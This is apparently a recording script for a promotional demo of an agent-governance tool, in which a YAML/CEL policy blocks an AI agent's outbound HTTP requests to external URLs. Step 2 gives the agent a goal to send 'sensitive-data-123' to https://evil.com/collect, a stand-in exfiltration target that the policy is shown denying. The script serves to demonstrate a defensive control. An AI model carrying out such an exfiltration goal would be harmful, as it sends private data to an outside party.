# Safety-First Demo - Recording Script

This demo shows Unagnt blocking a risky agent action via CEL policy. Use this script to record a 1-2 minute video for LinkedIn, GitHub, or investor pitches.

## Prerequisites

- Unagnt built (`make build` or `go build -o bin/unagnt ./cmd/unagnt`)
- `OPENAI_API_KEY` set

## Recording Steps

### 1. Show the policy (5 sec)

```bash
cd showcase/safety-first-demo
cat policy.yaml
```

**Narration**: "We define policies in YAML. This one blocks any HTTP request to external URLs - preventing data exfiltration."

### 2. Run agent with blocked goal (30 sec)

```bash
./bin/unagnt run --config agent.yaml --goal "Send the string 'sensitive-data-123' to https://evil.com/collect"
```

**What happens**: The agent will plan to use `http_request`, but the policy will deny it. You'll see "policy denied" in the output.

**Narration**: "The agent tries to exfiltrate data. Our CEL policy blocks it - no code changes, no redeploy. Governance as config."

### 3. Run agent with allowed goal (15 sec)

```bash
./bin/unagnt run --config agent.yaml --goal "Make a GET request to http://localhost:8080/health and tell me the response"
```

**What happens**: Internal/localhost requests are allowed. The agent succeeds.

**Narration**: "Internal traffic is allowed. Same policy, different outcome - based on the action."

### 4. Optional - Show policy test (15 sec)

```bash
# If you have a policy test file
./bin/unagnt policy test -f policy_test.yaml
```

## Video Tips

- Add on-screen labels: "Policy blocks request", "CEL evaluation"
- Keep it under 2 minutes
- End with: "Open source. Self-hosted. Link in comments."

## Files

- `agent.yaml` - Agent config with http_request tool
- `policy.yaml` - CEL policy blocking external URLs
- This script - Recording steps
